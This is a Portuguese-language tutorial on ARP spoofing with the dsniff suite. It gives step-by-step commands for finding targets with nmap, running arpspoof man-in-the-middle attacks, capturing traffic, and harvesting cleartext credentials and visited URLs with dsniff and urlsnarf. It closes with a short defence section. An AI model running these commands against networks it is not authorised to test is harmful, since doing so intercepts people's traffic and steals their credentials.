# ARP Spoofing with Dsniff

## Introdução

ARP Spoofing é uma técnica utilizada para interceptar tráfego de rede entre dois dispositivos em uma rede local (LAN). A ferramenta `dsniff` é uma suíte que contém diversas ferramentas para captura e análise de tráfego, e entre elas está o `arpspoof`, utilizado para realizar ataques de ARP Spoofing. 

## Instalação

### Kali Linux

A suíte `dsniff` pode ser instalada diretamente dos repositórios oficiais:

```bash
sudo apt-get update
sudo apt-get install dsniff
```

## Conceitos Básicos

### ARP (Address Resolution Protocol)

ARP é um protocolo usado para mapear endereços IP a endereços MAC em uma rede local. Quando um dispositivo precisa se comunicar com outro na mesma rede, ele usa ARP para descobrir o endereço MAC do dispositivo destino.

### ARP Spoofing

ARP Spoofing é um ataque onde um atacante envia mensagens ARP falsas para uma rede local. Isso pode levar ao redirecionamento de tráfego entre dispositivos, permitindo ao atacante interceptar, modificar ou bloquear comunicações.

## ARP Spoofing com `arpspoof`

### Identificar o Alvo e o Gateway

#### Identificar o Gateway

O gateway é geralmente o roteador da rede. Para descobrir o gateway:

```bash
ip route show
```

O gateway é geralmente o IP listado após a palavra `default`.

#### Identificar o Alvo

Identifique o IP do dispositivo alvo na rede local. Você pode usar ferramentas como `nmap` para escanear a rede:

```bash
sudo nmap -sn 192.168.1.0/24
```

### Habilitar o IP Forwarding

Para redirecionar o tráfego através do seu dispositivo, habilite o IP forwarding:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### Executar o ARP Spoofing

#### Spoofar o Gateway para o Alvo

Em uma janela do terminal, execute:

```bash
sudo arpspoof -i <interface> -t <IP_do_Alvo> <IP_do_Gateway>
```

#### Spoofar o Alvo para o Gateway

Em outra janela do terminal, execute:

```bash
sudo arpspoof -i <interface> -t <IP_do_Gateway> <IP_do_Alvo>
```

Substitua `<interface>` pelo nome da interface de rede (ex.: `eth0`, `wlan0`), `<IP_do_Alvo>` pelo IP do dispositivo alvo e `<IP_do_Gateway>` pelo IP do gateway.

### ARP Spoofing entre Dispositivos na Mesma Rede

Se os dispositivos estiverem na mesma sub-rede (ou seja, no mesmo segmento de rede), você não precisa usar o gateway para realizar ARP spoofing. Você pode direcionar o ataque diretamente entre os dispositivos na mesma sub-rede pois eles se comunicam diretamente.

#### Spoofing do dispositivo A (vítima) para o dispositivo B:

```bash
sudo arpspoof -i <interface> -t <IP_da_vitima_A> <IP_da_vitima_B>
```

Substitua <interface> pela interface de rede (por exemplo, eth0 ou wlan0), <IP_da_vitima_A> pelo endereço IP do dispositivo A (vítima) e <IP_da_vitima_B> pelo endereço IP do dispositivo B.

#### Spoofing do dispositivo B para o dispositivo A:

```bash
sudo arpspoof -i <interface> -t <IP_da_vitima_B> <IP_da_vitima_A>
```

### Capturar o Tráfego

Use ferramentas como `tcpdump` ou `Wireshark` para capturar e analisar o tráfego interceptado:

```bash
sudo tcpdump -i <interface> -w captura.pcap
```

ou

```bash
wireshark captura.pcap
```

## Exemplos de Uso

### Interceptar Credenciais HTTP

Utilize `dsniff` para capturar credenciais transmitidas em texto claro:

```bash
sudo dsniff -i <interface>
```

### Interceptar URLs 

Para capturar URLs acessadas pela vítima:

```bash
sudo urlsnarf -i <interface>
```

## Mitigação e Defesas

### Configuração de Switches
- **Port Security**: Configure switches para limitar o número de endereços MAC por porta.
- **Dynamic ARP Inspection (DAI)**: Utilize switches que suportem DAI para inspecionar e validar mensagens ARP.

### Ferramentas de Detecção
- **ARPwatch**: Monitora mudanças de endereços IP/MAC na rede.
- **XArp**: Ferramenta gráfica para detectar ataques ARP.

### Utilização de Protocolos Seguros
- **HTTPS/TLS**: Utilize protocolos criptografados para comunicação segura.
- **VPN**: Utilize redes privadas virtuais para criptografar tráfego entre dispositivos.